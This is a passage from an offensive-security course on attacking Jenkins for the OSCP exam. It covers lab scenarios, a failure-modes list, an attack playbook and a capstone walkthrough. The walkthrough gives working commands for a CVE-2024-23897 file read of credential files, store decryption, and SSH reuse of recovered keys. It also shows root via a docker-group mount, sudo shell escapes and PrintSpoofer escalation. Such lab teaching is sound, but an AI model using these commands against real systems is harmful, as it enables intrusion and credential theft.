- **Objective:** practise decrypt-and-reuse against another host.
- **Setup:** foothold via Script Console (as Lab 3); store holds `deploy:Autumn2026!` which is
  the SSH password on the `target` container/host.
- **Tasks:** decrypt the store; identify a credential that opens another host; use it.
- **Questions:** What's in the store? Which credential targets another machine? Does it work?
- **Expected discoveries:** decrypt → `deploy:Autumn2026!` → `ssh deploy@target` → lateral
  foothold.
- **Hints:** (1) Decrypt from the console (Part X.4) — no key files needed. (2) Jenkins creds
  exist to reach *other* systems. (3) Try the recovered cred against every reachable host.
- **Full solution:** Script Console → dump creds → `deploy:Autumn2026!` → `ssh deploy@<target>`
  → shell on the second host → its flag.
- **Alt paths:** an SSH *key* in the store instead of a password.
- **Lessons:** the controller is a secrets hub; decrypt-and-reuse is the core Jenkins lateral
  move.

## 22.6 Lab 6 — Job-creation rights → build-step RCE

- **Objective:** RCE without the Script Console, via a job.
- **Setup:** a matrix strategy granting an account `Job/Create`+`Configure`+`Build` but *not*
  `RunScripts`; you get that account's creds (or register).
- **Tasks:** confirm no Script Console; create a Freestyle/pipeline job with a shell step;
  build; catch the shell.
- **Questions:** Does `/script` 403? Can you create a job? Does the build step run your
  command? Where does it run (controller or agent)?
- **Expected discoveries:** `/script` denied but "New Item" available → job with `sh` → build →
  shell on the built-in node.
- **Hints:** (1) A job's build step is a command shell. (2) The API `createItem` + `build`
  does it headless. (3) `sh`/`bat` steps aren't blocked by the Groovy sandbox.
- **Full solution:** create a Freestyle job (config.xml with `hudson.tasks.Shell`) via
  `createItem` (+crumb) → POST `/job/pwn/build` → reverse shell (Part IX.3). 
- **Alt paths:** pipeline `node { sh '...' }`; hijack an existing job you can configure.
- **Lessons:** job rights = RCE; the sandbox governs Groovy tricks, not `sh` steps.

## 22.7 Lab 7 — Weak/reused credentials → admin → RCE

- **Objective:** the reuse doctrine into admin.
- **Setup:** anonymous-readable build log leaks a token/password (as Lab 1); the same password
  is the admin's; UI otherwise needs login.
- **Tasks:** harvest the leaked cred; try it at the Jenkins login; reach RCE.
- **Questions:** Where's the cred leaked? Does it work as admin? What does admin unlock?
- **Expected discoveries:** build-log cred = admin password → login → Script Console → RCE.
- **Hints:** (1) Read build logs. (2) Try the leaked cred at the login, not just where you
  found it. (3) Admin → `/script`.
- **Full solution:** console log → `admin`-reused password → login → Manage Jenkins → Script
  Console → RCE.
- **Alt paths:** the leaked value is an API token → drive `/scriptText` via curl.
- **Lessons:** leaked creds + reuse are a top Jenkins path; always try harvested creds at the
  login.

## 22.8 Lab 8 — Anonymous read → job-config credential harvest

- **Objective:** turn read-only access into creds via job configs (not just logs).
- **Setup:** anonymous read; a job `config.xml` referencing a credential and a second job whose
  pipeline embeds a secret in plaintext (a common mistake).
- **Tasks:** read every job config; extract embedded/leaked secrets; use them.
- **Questions:** What do the job configs reveal? Any plaintext secret or `{AQAA...}` blob? What
  does it open?
- **Expected discoveries:** a plaintext secret (or a decryptable `{AQAA...}` once you get RCE)
  → login/lateral.
- **Hints:** (1) `job/<name>/config.xml`. (2) Plaintext secrets hide in pipeline scripts. (3) A
  `{AQAA...}` string is a Jenkins-encrypted secret — note it for decryption.
- **Full solution:** read configs → find a hardcoded password in a pipeline `sh` line → reuse
  at login/other host. (If only `{AQAA...}` blobs, decrypt after RCE via Part X.4.)
- **Alt paths:** the workspace (`/ws/`) exposes a `.env`.
- **Lessons:** read access is a credential mine; job configs and pipelines leak secrets people
  think are hidden.

## 22.9 Lab 9 — Agent lateral movement

- **Objective:** from controller RCE, run code on an agent and pivot.
- **Setup (Docker):** base compose with the `agent` service connected; a job/label pins builds
  to the agent; the agent holds a flag / a path onward.
- **Tasks:** enumerate nodes; run a command on the agent (via a pinned job or Groovy remoting);
  land on the agent.
- **Questions:** What agents exist? How do you execute *on* an agent vs the controller? Where
  did your shell land?
- **Expected discoveries:** node list → build pinned to agent (or `RemotingDiagnostics`) → shell
  on the agent.
- **Hints:** (1) `/computer/api/json` lists nodes. (2) A build runs on its assigned node — pin
  it to the agent. (3) The controller can run Groovy on an agent's channel.
- **Full solution:** Script Console → `RemotingDiagnostics.executeGroovy` on the agent channel
  (Part XIV.3), or create a job restricted to the agent label with an `sh` step → shell on the
  agent → its flag.
- **Alt paths:** reuse the agent SSH key from the store to SSH the agent directly.
- **Lessons:** the controller is a jump box to every agent; where a build runs is where your
  shell lands.

## 22.10 Lab 10 — Windows privilege escalation (VM required)

- **Objective:** web/RCE → SYSTEM on Windows Jenkins.
- **Setup (VM):** Windows Jenkins; variant A service as LocalSystem (RCE=SYSTEM), variant B
  limited service acct with SeImpersonate. Foothold via Script Console/job.
- **Tasks:** post-shell orientation; determine privilege; escalate.
- **Questions:** `whoami`? Service account (`sc qc Jenkins`)? SeImpersonate? Shortest path?
- **Expected discoveries:** A: already SYSTEM. B: SeImpersonate → PrintSpoofer/GodPotato →
  SYSTEM.
- **Hints:** (1) `whoami` first — you may be SYSTEM. (2) `whoami /priv`. (3) Potato converts
  SeImpersonate to SYSTEM.
- **Full solution:** A: `whoami` → SYSTEM → proof. B: `whoami /priv` shows SeImpersonate →
  `certutil` PrintSpoofer64.exe → `PrintSpoofer.exe -i -c cmd` → SYSTEM. Also try
  `icacls "C:\Program Files\Jenkins\jenkins.exe"` (writable → replace+restart).
- **Alt paths:** decrypted store creds → local admin.
- **Lessons:** Windows Jenkins often gives SYSTEM free; SeImpersonate→Potato is the backup.

## 22.11 Lab 11 — Linux privilege escalation (VM required)

- **Objective:** jenkins → root on Linux, via the characteristic Jenkins-host vectors.
- **Setup (VM):** Jenkins as `jenkins`; add `jenkins` to `docker` group + install Docker
  (variant A), or give `jenkins` NOPASSWD sudo to a GTFOBins binary (variant B). Foothold via
  Script Console/job.
- **Tasks:** orientation; find the vector; escalate.
- **Questions:** Which user? Is `jenkins` in `docker`? `sudo -l`? Any reusable store cred for
  root?
- **Expected discoveries:** A: `docker` group → root via mounted-host container. B: `sudo -l` →
  GTFOBins → root.
- **Hints:** (1) `id` — check groups. (2) `docker` group is game over. (3) `sudo -l` and the
  decrypted store.
- **Full solution:** A: `id` shows `docker` → `docker run -v /:/mnt --rm -it alpine chroot /mnt
  sh` → root. B: `sudo -l` → e.g. `sudo /usr/bin/vim -c ':!/bin/sh'` → root. Also: decrypt
  store → root SSH key → `ssh root@localhost`.
- **Alt paths:** SUID/cron; store credential reuse.
- **Lessons:** the `docker` group and store-credential-reuse are the signature Jenkins-Linux
  root paths; check `id` and `sudo -l` and decrypt the store first.

## 22.12 Lab 12 — Multi-stage chain (capstone)

- **Objective:** chain rings end-to-end, exam-style, no single-step win.
- **Setup:** UI locked down; version 2.426.1 (CVE-2024-23897 in range); the store holds an SSH
  key for a `deploy` user; `deploy` on the box is in the `docker` group (→ root); an agent
  holds a separate flag.
- **Tasks:** the whole methodology.
- **Questions (open):** How do you read files on a locked-down Jenkins? How do you turn file
  read into access? From `deploy`, how do you reach root? What's on the agent?
- **Expected discoveries:** 2024-23897 → decrypt store → SSH as `deploy` → `docker` group →
  root; plus controller RCE → agent lateral for the second flag.
- **Hints:** (1) Locked-down UI + in-range version → the CLI file-read. (2) The store's SSH key
  is your way onto the OS. (3) `id` on `deploy`.
- **Full solution:** confirm version → CVE-2024-23897 CLI read → pull the three files → decrypt
  → `deploy` SSH key → `ssh deploy@box` (user flag) → `id` shows `docker` → container-mount →
  root (root flag). Separately, `initialAdminPassword`/admin → Script Console → agent lateral
  for its flag.
- **Alt paths:** if setup wasn't finished, `initialAdminPassword` → admin → Script Console
  short-circuits the CLI step.
- **Lessons:** exam Jenkins is a chain across rings; the CLI file-read + store decryption +
  credential reuse + a Linux group is a complete, realistic path — hold the ring model and the
  reuse doctrine simultaneously.

### Using the lab well

Run each scenario twice — once cold and time-boxed (Part XXI), once trying the alternative
paths. Do 10/11/12 in the VMs for the real OS half (on-disk store decryption, docker/Potato
privesc, stabilisation). The goal isn't twelve memorised boxes — it's that an *unfamiliar*
Jenkins triggers the reflexes: version + `/script` first, get an identity or a file-read,
reach the execution core, decrypt the store, reuse and pivot.

---

# PART XXIII — Failure Modes: How Jenkins Attacks Go Wrong

The other half of skill is not defeating yourself. Each failure below has an *early warning
sign* so you can catch it mid-mistake.

**1. Brute-forcing a login the box doesn't require you to crack.** *Mistake:* grinding
`hydra` on `/login` while the version has a pre-auth file-read (2024-23897) or `/script` is
open. *Sign:* you're brute-forcing and you haven't checked `/script` or the version. *Fix:*
instant-win checks first (Part III step 2); most Jenkins boxes don't need a cracked login.

**2. Stopping at "I logged in."** *Mistake:* treating authentication as the win, then being
stuck because your account only has `Overall/Read`. *Sign:* you're logged in but can't find
anything to *do*. *Fix:* authorization is the boundary — check `/whoAmI` and look for
Script Console / New Item / Manage Jenkins; an account that can't execute is an info
position, not a foothold.

**3. Ignoring the version.** *Mistake:* skipping the `X-Jenkins` version and missing that
it's in range for CVE-2024-23897 or a pre-auth RCE. *Sign:* you're deep in manual enum and
never wrote down the version. *Fix:* the version is a *first-class* lead on Jenkins — grab it
in minute one and map the marquee CVEs.

**4. Assuming the Groovy sandbox blocks everything.** *Mistake:* concluding pipeline RCE is
impossible because "Groovy is sandboxed," when `sh`/`bat` steps run commands freely. *Sign:*
you gave up on a job/pipeline because pure-Groovy `.execute()` was blocked. *Fix:* use an
`sh`/`bat` step (Part IX.4); the sandbox governs Groovy language tricks, not shell steps.

**5. Not decrypting the credential store.** *Mistake:* getting RCE and doing privesc the hard
way while the store holds a root SSH key. *Sign:* you're grinding linpeas and haven't touched
`credentials.xml`. *Fix:* decrypt the store *immediately* after RCE (Part X.4) — it's usually
the privesc *and* the lateral move.

**6. Ignoring build logs and job configs.** *Mistake:* not reading the console output/configs
that leak `git clone https://user:token@...`, deploy passwords, and hardcoded secrets. *Sign:*
you have anonymous/read access and only looked at the dashboard. *Fix:* read every readable
build log and job config — they're a top credential source.

**7. CVE-shotgunning plugins/core without validation.** *Mistake:* firing PoCs for versions
that don't match, crashing or wasting time. *Sign:* you're editing a PoC without having
confirmed the exact version/range or read the exploit. *Fix:* the six-question filter (Part
XIII); validate the range and preconditions, read the PoC.

**8. Missing a proxied / non-default Jenkins.** *Mistake:* concluding "no Jenkins" because
8080 is closed, when it's behind nginx at `/jenkins/`. *Sign:* you saw a plain web server and
moved on without checking context paths / the `X-Jenkins` header at `/`. *Fix:* probe common
context paths and headers on any web box (Part II.4).

**9. Not checking whether you're already SYSTEM (Windows).** *Mistake:* running privesc
enumeration when RCE already gave you SYSTEM. *Sign:* you got a Windows shell and started
winPEAS without `whoami`. *Fix:* `whoami` first; Jenkins-Windows is often SYSTEM by default.

**10. Overlooking `docker` group / `sudo -l` (Linux).** *Mistake:* deep privesc hunting when
`jenkins` is in `docker` or has a sudo entry. *Sign:* stuck on Linux privesc without having
run `id` and `sudo -l`. *Fix:* those two commands first — they're the common Jenkins-host
roots.

**11. Not distinguishing controller from agent.** *Mistake:* assuming your build shell is on
the controller when it landed on an agent (so the store/JENKINS_HOME "isn't there"). *Sign:*
you have a shell but can't find `credentials.xml`. *Fix:* check the build log's "Running on
<node>"; pin builds to the built-in node to land on the controller (Part IX.5).

**12. Treating anonymous-can't-read-UI as game over.** *Mistake:* giving up on a locked-down
Jenkins. *Sign:* "anonymous 403s everything, dead end." *Fix:* the CLI file-read
(2024-23897) works on exactly those instances; open signup and leaked creds also bypass the
UI lockdown.

### The meta-failure

Every item is a variant of the same two errors: **not taking the instant win Jenkins offers**
(open `/script`, version CVE, decrypt-and-reuse), and **confusing authentication with
authorization / read with execute**. The antidotes are the Part III instant-win checks, the
`/whoAmI`-driven authorization question, and the reflex to decrypt the store the moment you
have code execution.

---

# PART XXIV — The OSCP Jenkins Playbook

The operational answer to "I ran Nmap and found Jenkins — what now?" 21 steps, each with the
questions to ask. Ordered for the exam: instant wins first, exploit-dev last.

**1. Confirm Jenkins & grab the version.** *Ask:* `X-Jenkins` header? Jetty + `[Jenkins]` +
port 50000? Exact version from header/footer/error page? *Why:* the version is a primary lead.

**2. Instant-win check: Script Console.** *Ask:* does `/script` (or `/scriptText`) load for
anonymous? *Why:* one request from RCE.

**3. Instant-win check: version CVE.** *Ask:* is the version ≤2.426.2/2.441 (CVE-2024-23897
file read) or ≤2.138.3/2.153 (pre-auth RCE)? *Why:* these often *are* the box.

**4. Instant-win check: credentials.** *Ask:* `admin:admin`/blank/reused? Any creds already
leaked (another service, git)? *Why:* a working admin login = Script Console.

**5. Determine anonymous access.** *Ask:* dashboard visible? user list? readable job configs/
build logs? *Why:* read access is a credential mine even without execution.

**6. Harvest from what's readable.** *Ask:* what do build logs and job configs leak
(tokens, `git clone https://user:token@`, hardcoded passwords)? *Why:* these creds usually
unlock execution.

**7. Get an identity.** *Ask:* open signup? weak/reused/leaked creds? a leaked API token?
*Why:* the usual prerequisite to an execution primitive.

**8. Determine authorization.** *Ask (via `/whoAmI` + visible UI):* do I have
`Overall/RunScripts`, `Overall/Administer`, or `Job/Create`+`Configure`+`Build`? *Why:* this
is the real perimeter — execution rights, not just login.

**9. Map execution primitives.** *Ask:* which do my rights + the version unlock — Script
Console, a job build step, the CLI `groovy`, a vulnerable plugin? *Why:* pick the cleanest
route to RCE.

**10. Enumerate plugins (if core patched).** *Ask:* any plugin at a vulnerable version?
*Why:* the plugin surface is where a hardened-core box often breaks.

**11. Reach code execution.** *Ask:* did `id`/`whoami` confirm RCE? On Windows, am I already
SYSTEM? *Why:* the foothold — and possibly the whole box on Windows.

**12. Decrypt the credential store — immediately.** *Ask:* what does the store hold (SSH keys,
passwords, tokens), decrypted via Groovy (Part X.4)? *Why:* highest-value post-RCE action;
usually the privesc and lateral move.

**13. Read on-disk secrets.** *Ask:* `initialAdminPassword`, `users/*/config.xml` (hashes),
build logs on disk, `~/.ssh`? *Why:* more creds, more reuse.

**14. Inspect the OS context.** *Ask:* who is the Jenkins user? groups (`docker`?)? `sudo -l`?
SeImpersonate? *Why:* decides the privesc path.

**15. Reuse credentials everywhere.** *Ask:* have I tried every decrypted/leaked cred against
the host (SSH/su/RDP/WinRM), other hosts, and the Jenkins login? *Why:* the reuse doctrine is
the dominant Jenkins privesc/lateral mechanism.

**16. Enumerate agents.** *Ask:* what nodes exist, and can I run code on them (pinned job /
Groovy remoting)? *Why:* lateral movement; the network is bigger than one box.

**17. Validate any CVE before committing.** *Ask:* does the candidate pass the six questions
(range, remote, auth, payoff, reliability, preconditions)? *Why:* avoid the PoC time-sink.

**18. Establish a stable foothold.** *Ask:* upgraded from Groovy/build RCE to a real reverse
shell + TTY? *Why:* everything after is painful otherwise.

**19. Enumerate locally.** *Ask:* Part XVII orientation — privesc surface, other users,
services, crons? *Why:* the map for escalation.

**20. Privilege escalate.** *Ask:* Pattern A (docker/sudo/SeImpersonate/writable service) or
Pattern B (reuse a decrypted store credential for root/admin)? *Why:* Jenkins tilts toward
Pattern B — decrypt first.

**21. Document the chain.** *Ask:* full path, working commands, decrypted secrets + what each
opened, and proof screenshots (`hostname`+`whoami`/`id`+flag)? *Why:* exam points need proof
and a reproducible narrative.

### The playbook in one breath

Confirm Jenkins and grab the version (1); take any instant win — open `/script`, the file-read
CVE, weak creds (2–4); mine read access and get an identity with *execution* rights (5–9);
reach RCE (10–11); **decrypt the credential store immediately** (12–13); check the OS context
and *reuse every credential* (14–16); validate before committing, stabilise, and escalate via
docker/sudo/SeImpersonate or store-credential reuse (17–20); document throughout (21). Held in
your head, that lets you walk up to any Jenkins with no walkthrough and always know the next
move.

---

# PART XXV — Final Practical Challenge: "PIPEWORK"

The graduation exercise. A realistic OSCP-style machine where Jenkins isn't the obvious
target, multiple services beckon, some are decoys, the way in requires reading before
executing, and privilege escalation connects a secret from one stage to a group membership
in another. Build it in the VM path (real OS privesc); a Docker approximation covers all but
the finale.

**Do not read the walkthrough until you've spent at least two focused hours.** Open hints in
order, only when truly stuck.

## 25.1 Target information

- **Name:** PIPEWORK. **Type:** standalone single host. **OS:** Linux (undisclosed at start).
  **Difficulty:** intermediate. **Points (notional):** 20. Student gets only an IP.

## 25.2 Rules of engagement

- In scope: the single target IP. Out of scope: gateway, your Kali, the internet. No DoS.
  Metasploit on this one machine only (the intended path is manual). Two flags: `local.txt`
  (user context) and `proof.txt` (root), each proven with `hostname`+`id`+`cat`.

## 25.3 Starting point

```text
$ nmap -sC -sV -p- --min-rate 2000 -oA pipework 10.10.10.90
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
80/tcp   open  http     nginx 1.18.0
|_http-title: PipeWork — Internal Tools
8080/tcp open  http     Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-headers:
|_  X-Jenkins: 2.426.1
3306/tcp open  mysql    MySQL 8.0.36
```

## 25.4 Student objectives

Enumerate all services; separate real paths from decoys; recognise the Jenkins behind 8080
(and note it may also be proxied under nginx); get a foothold via Jenkins; recover secrets;
escalate to root by connecting findings; capture both flags.

## 25.5 Enumeration requirements

Per-service enumeration (22/80/8080/3306); Jenkins version + `/script` + `/whoAmI` + CVE-range
check; nginx site review (context path? leaked hints?); MySQL access attempt; a credential
inventory with sources; and a clear statement of which leads were decoys and why.

## 25.6 Deliberate decoys and dead-ends (instructor notes)

- **MySQL 3306** allows a low-priv app login (creds guessable) but the DB holds only benign
  app data and *no* `FILE` privilege / useful reuse — a *time-sink decoy* for students who
  reflexively attack the database.
- **nginx :80** is a static "internal tools" page with a comment hinting at `/jenkins/` — a
  breadcrumb, not a vuln. It also serves a fake `/login` that looks attackable but isn't.
- **The Jenkins Script Console is NOT anonymous** and the admin password is strong — a student
  who only tries `/script` and `admin:admin` stalls. The real Jenkins path is the version CVE.
- **A plugin looks old** but its CVE needs admin — a decoy for plugin-CVE shotgunners.

## 25.7 Optional hints (sealed — open in order)

> **Hint 1.** Two of the four services are noise. Which are cheap to rule out? Rule them out
> and don't return unless everything else fails.

> **Hint 2.** Jenkins' Script Console is locked and the admin password is strong. Brute force
> is not the path. What did the *version* tell you?

> **Hint 3.** Jenkins 2.426.1 is in range for a well-known 2024 CLI vulnerability. It reads
> files even when the UI shows you nothing.

> **Hint 4.** File read on the controller → which three files let you decrypt Jenkins'
> credential store?

> **Hint 5.** The store holds an SSH key. Whose account does it open? Try it against port 22.

> **Hint 6.** You're now a user on the box. What groups are you in? One of them is a well-known
> instant root.

## 25.8 Full walkthrough (intended path)

**Recon & triage.** 22/80/8080/3306. Decoy triage: MySQL — a guessable app login
(`app:app`) opens a benign DB, no `FILE`, no reuse → time-box and drop. nginx :80 — static
page; source comment mentions the CI server at `/jenkins/` (a breadcrumb confirming Jenkins is
the target) and a fake login → note and move on. The real target is Jenkins on 8080 (also
reachable proxied at `http://target/jenkins/`).

**Jenkins foothold via CVE-2024-23897.** Version `2.426.1` (from `X-Jenkins`). `/script` is
403 (not anonymous); `admin:admin` fails (strong password); `/signup` closed. But 2.426.1 is
**in range for CVE-2024-23897**. Grab `jenkins-cli.jar` from `/jnlpJars/`; confirm the
file-read primitive on `/etc/passwd`:

```text
$ java -jar jenkins-cli.jar -s http://10.10.10.90:8080/ -http connect-node "@/etc/passwd"
ERROR: No such agent "root:x:0:0:...:/bin/bash" exists.   # file contents leaked back
```

Read the three store-decryption files:
`/var/lib/jenkins/secrets/master.key`, `/var/lib/jenkins/secrets/hudson.util.Secret`,
`/var/lib/jenkins/credentials.xml`.

**Decrypt the store.** Offline (`jenkins_decrypt.py master.key hudson.util.Secret
credentials.xml`) → recovers an SSH private key labelled for user **`ci-deploy`** (plus a DB
cred that's the MySQL decoy — corroborating that the DB was a dead end).

**User foothold.** `ssh -i ci-deploy.key ci-deploy@10.10.10.90` → shell as `ci-deploy` →
`local.txt`.

**Privilege escalation (connect the pieces).** `id` on `ci-deploy` → member of the **`docker`**
group (this host builds container images — a realistic reason). Instant root:

```text
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id → uid=0(root)
# cat /root/proof.txt
```

**Proof.** `hostname`+`id`+`cat local.txt` (as ci-deploy) and `hostname`+`id`+`cat
/root/proof.txt` (root).

## 25.9 Alternative valid paths

- **Read `initialAdminPassword`** via the same CVE (if the setup wizard state left it) → admin
  → Script Console → RCE as `jenkins` → decrypt store from Groovy → same SSH key → same
  docker-group root. (Reaches the finale via controller RCE instead of direct SSH.)
- **Script Console decrypt** if you obtain admin any way → online Groovy decrypt (Part X.4)
  instead of offline.
- **jenkins → root without SSH:** get controller RCE (via admin+Script Console), and if the
  `jenkins` user itself is in `docker` (variant), root directly from the RCE.
- **sudo variant:** in an alternate build, `ci-deploy` has a NOPASSWD sudo → GTFOBins root.

## 25.10 Post-exploitation analysis

The report should identify the real break: an unpatched Jenkins (CVE-2024-23897) exposing the
credential store, whose SSH key reused an OS account that was over-privileged (`docker`
group). Note the decoys that cost time (MySQL, the fake nginx login, the admin-only plugin
CVE). Dump remaining secrets for impact.

## 25.11 Lessons learned (the whole course in one box)

PIPEWORK is engineered so every failure mode (Part XXIII) is a trap and every core habit is
the escape: triage decoys fast (MySQL/nginx), don't brute the strong admin login, *read the
version* and recognise CVE-2024-23897, understand that file-read defeats a locked-down UI,
target the three store-decryption files, **reuse the recovered SSH key**, and check `id` for
the `docker` group before grinding privesc. The pieces are scattered across services and
rings on purpose; solving it means holding the ring model (Part I), the file-read→decrypt→
reuse chain, and the group-membership privesc simultaneously — exactly the capability this
course set out to build: not a memorised walkthrough, but the ability to meet an unfamiliar
Jenkins and *systematically figure out what to do next.*

---

# Closing: how to think when you see Jenkins

The compression of the whole course:

> **I see Jenkins → I know it exists to execute code, and that authorization (not
> authentication) is the real boundary → I grab the version and check the instant wins (open
> `/script`, CVE-2024-23897 file read, weak/leaked creds) → if none, I get an identity and find
> the permission or CVE that equals execution → I reach code execution as the Jenkins user
> (often SYSTEM on Windows) → I immediately decrypt the credential store → I reuse those secrets
> for privilege escalation and lateral movement to agents and other hosts → I document the
> chain.**

Jenkins is not a list of exploits to memorise. It is a remote-code-execution engine with a
login page, a secrets vault, and a hub of trust to other machines — attacked with a
methodology that works on any Jenkins the exam can invent. Build. Understand. Break.

*End of course.*









